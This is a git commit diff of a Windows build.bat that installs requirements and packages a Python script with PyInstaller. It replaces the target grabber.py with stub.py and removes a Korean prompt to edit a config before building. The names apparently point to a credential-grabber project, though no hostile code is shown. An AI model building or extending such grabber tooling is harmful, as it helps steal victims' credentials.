60828be8f290c9a95d8ec769d5ef6dcf2a8d809c
ANDYREAL <119683703+ANDYREAL0@users.noreply.github.com>
2023-10-04 15:21:52 +0900

    Update build.bat
    Signed-off-by: ANDYREAL <119683703+ANDYREAL0@users.noreply.github.com>

--- build.bat
+++ build.bat
@@ -1,8 +1,7 @@
 title Building...
+color 2
 @echo off
 cls
 pip install -r requirements.txt
-echo 빌드전에 __config__를 수정해주세요. 수정 하셨으면 아무키나 누르세요
-pause
-pyinstaller -F grabber.py
+pyinstaller -F stub.py
 exit
